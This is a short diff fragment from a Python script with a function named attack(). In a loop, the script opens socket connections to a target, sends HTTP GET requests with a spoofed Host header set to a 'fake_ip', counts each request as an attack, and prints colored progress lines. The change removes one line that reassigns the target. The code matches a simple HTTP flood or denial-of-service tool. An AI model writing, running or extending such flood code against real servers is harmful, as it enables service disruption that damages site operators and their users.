@@ -109,7 +109,6 @@ def attack():
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        target = ip
         global attack_num
         attack_num += 1
         print (f"{green}Sent{red} {send}{green} packet{blue} {ip}{green} port {yellow}{port}{default}")
